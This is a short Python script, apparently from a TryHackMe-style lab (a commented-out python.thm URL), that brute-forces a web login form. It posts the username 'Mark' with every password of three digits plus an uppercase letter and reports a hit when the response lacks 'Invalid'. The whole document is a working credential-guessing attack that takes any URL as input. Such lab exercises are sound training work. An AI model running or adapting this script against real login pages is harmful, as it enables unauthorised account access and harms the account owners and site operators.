import requests, string

#url = "http://python.thm/labs/lab1/index.php"
url = input("Enter the URL: ")

username = "Mark"

password_list = [str(i).zfill(3) + letter for i in range(1000) for letter in string.ascii_uppercase]

for password in password_list:
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=data)
    if "Invalid" not in response.text:
        print(f"[+] Found valid credentials: {username}:{password}")
        break
    else:
        print(f"[-] Attempted: {password}")